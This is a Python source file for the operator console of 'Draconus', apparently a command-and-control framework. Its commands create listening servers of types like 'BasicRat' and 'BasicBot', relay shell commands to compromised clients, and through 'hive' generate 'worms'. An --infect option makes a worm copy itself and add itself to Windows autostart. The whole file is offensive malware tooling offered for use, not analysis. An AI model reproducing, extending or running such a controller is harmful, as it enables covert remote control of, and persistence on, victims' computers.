import sys
import json
import os
import click

from click_shell import shell
from time import sleep

from app import Importer
from CC import CommandCenter

def build_draco_shell(CoCe=CommandCenter(), imp=Importer()):

    IMP = imp
    os.system("clear")
    print("[SYSTEM] Command Center Starting ...... ")
    if not CoCe.START():
        sys.exit()
    
    def exit_main_shell(*args, **kwargs):
        print("EXIT PROGRAM")
    
    @shell(prompt=f"[DRACONUS] >>", intro="------ Welcome To Draconus ! Put help for commands list ------- ", on_finished=exit_main_shell)
    def draco_shell():
        pass

    @draco_shell.command()
    def help():
        print("************ Draconus Base Commands ************\n")
        print("****** clr           - Clear screen")
        print("****** exit          - Exit Comand Center. Draconus still working")
        print("****** show          - Show servers list, types, files etc.")
        print("****** make          - Creates new server. see: 'make --help' for instruction")
        print("****** kill <name>   - Delete server. Ex: 'kill MyServer' ")
        print("****** start <name>  - Start server listening. Ex: 'start MyServer' ")
        print("****** stop <name>   - Stop server listening. Ex: 'stop MyServer' ")
        print("****** hive          - Creates worms (clients for specific server)'hive --help'")
        print("****** conn <name>   - Connect to Server Shell. Server must be created first.")
        print("****** theend        - Close Draconus and all servers")
    
###################################################################################################################################
    
    @draco_shell.command()
    def kkk():
        resp = CoCe.api_response("zzz", ["conf"], True)
        print(resp)
    
    @draco_shell.command()
    def klop():
        conf = {"NAME": "qqq", "PORT" : 1234, "TYPES": "BasicBot", "START_NOW": True, "DEV": True}
        CoCe.send_json(["make", conf])
        sleep(1)
        CoCe.find_servers()

###################################################################################################################################

    @draco_shell.command()
    def clr():
        os.system("clear")

###################################################################################################################################

    @draco_shell.command()
    @click.argument("name")
    def start(name):
        CoCe.send_json(["start", name])

###################################################################################################################################

    @draco_shell.command()
    @click.argument("name")
    def stop(name):
        CoCe.send_json(["stop", name])

###################################################################################################################################

    @draco_shell.command()
    @click.argument("name")
    def kill(name):
        CoCe.send_json(["kill", name])
        CoCe.kill_server(name)

###################################################################################################################################

    @draco_shell.command()
    def theend():
        print("\n[DRACONUS] ARE YOU SURE ? y / n")
        confirm = input()
        if confirm == "y":
            CoCe.send_json(["END"])
            sleep(2)
            os._exit(0)
    
###################################################################################################################################

    @draco_shell.command()
    @click.argument("types")
    @click.argument("name")
    @click.argument("port")
    @click.option("--start", "-s", is_flag=True, required=False, help="Start Listening server immediately")
    def make(start, types, name, port):
        """\n------------------ MAKE function ----------------\n
--- 'make' creates new server. See 'show --types' for servers types\n
--- 'make <types> <name> <port>'  - Creates New Server\n
--- <types>  - Types of server. (Echo, BasicRat etc.)\n
--- <name> - Server Name\n
--- <port> - Server Port\n
--- ex: make Echo MyServer 1234\n
--- ex: make Echo MyServer 2222 -s   - starts listening immediately\n
--- ex: make Echo MyServer 2222 -s -np  - starts listening immediately and show only important messages\n
"""
        conf = {"NAME": name, "TYPES": types, "PORT": port}
        if start:
            conf["START_NOW"] = True
        
        CoCe.send_json(["make", conf])
        sleep(1)
        CoCe.find_servers()
    
###################################################################################################################################

    @draco_shell.command(context_settings={'help_option_names': ['-h', '--help']})
    @click.argument("name")
    @click.option("--infect", "-i", is_flag=True, required=False, help="Worm can infect clients. Worm is cloning self and add to autostart. Works only on Windows !!!")
    def hive(name, infect):
        """\n -------------------- Welcome to hive ------------------------
        ----------- hatchering new worm working with specific server ------\n
        --- hive <server_name>              - Hatching new Worm. ex: 'hive MyServer'
                                            - server must exists\n"""
        conf = {}
        if name:
            if infect:
                conf["INFECT"] = True
            resp = CoCe.api_response(name, ["conf"], True)
            conf.update(resp)
            CoCe.send_json(["HIVE", name, conf])
    
###################################################################################################################################

    @draco_shell.command()  
    @click.option("--config", "-c", required=False, is_flag=True, help="Show configurations of active servers")
    @click.option("--types", "-t", is_flag=True, required=False, help="Show available servers type")
    def show(config, types):
        if config:
            CoCe.send_json(["show"])
        if types:
            CoCe.send_json(["types"])

###################################################################################################################################   

    @draco_shell.command()
    @click.option("--load", "-l", required=False)
    @click.option("--save", "-s", required=False)
    def imp(load, save):
        if load:
            conf = IMP.load_config(load)
            if not conf:
                print("[DRACONUS] [!!] ERROR: No config files [!!]")
                return False
            else:
                CoCe.send_json(["make", conf])
                sleep(1)
                CoCe.find_servers()
        if save:
            conf = CoCe.api_response(save, ["conf"], True)
            if not conf:
                print("[DRACONUS] [!!] ERROR: Recive config data [!!]")
                return False
            IMP.save_config(save, conf)
        


###################################################################################################################################

    @draco_shell.command()
    @click.argument("name")
    def conn(name):
        if name:
            if not name in CoCe.Api:
                print("[DRACONUS] [!!] Error Server does not exist [!!]")
                return False
            check = CoCe.api_response(name, ["check"], True)
            if check[0] == "OK":
                server_shell = build_server_shell(name, CoCe)
                server_shell()

    
    return draco_shell

###################################################################################################################################


def build_server_shell(Name, CoCe):


    def exit_server_shell(*args, **kwargs):
        print("[DRACONUS] Exit Server Shell")

    @shell(prompt=f"[{Name}] >>", intro="------ Server Shell. Commands will be send directly to server ! Put help for commands list ------- ", on_finished=exit_server_shell)
    def server_shell():
        pass

    @server_shell.command()
    def help():
        hilfe = "\n------------- Server Shell Command ----------- \n"
        hilfe += "------ ss <command>      - Send Command to server \n"
        hilfe += "------ clr               - Clear Screen \n"
        hilfe += "-----------------------------------------------------------------------------\n"
        extra = CoCe.api_response(Name, ["help"], True)
        hilfe += extra[0]
        print(hilfe)
    
    @server_shell.command()
    def clr():
        os.system("clear")

    @server_shell.command()
    @click.argument("cmd")
    def ss(cmd):
        if cmd:
            CoCe.send_json(["serv", Name, cmd])

    return server_shell



